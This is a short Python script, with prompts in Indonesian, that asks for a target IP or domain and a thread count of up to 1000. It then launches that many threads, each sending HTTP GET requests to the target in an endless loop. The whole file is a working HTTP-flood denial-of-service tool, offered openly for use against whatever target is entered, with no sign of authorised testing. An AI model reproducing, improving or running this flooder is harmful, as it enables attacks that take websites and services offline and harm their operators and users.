import requests, threading

target = input("Masukkan IP/DOMAIN Target: ")
thread_count = int(input("Jumlah Threads (50-1000): "))

def attack():
    while True:
        try:
            res = requests.get("http://" + target)
            print(f"[💥] Serang {target} | Status: {res.status_code}")
        except:
            print("[⚠️] Gagal nyambung ke target")

for i in range(thread_count):
    t = threading.Thread(target=attack)
    t.start()
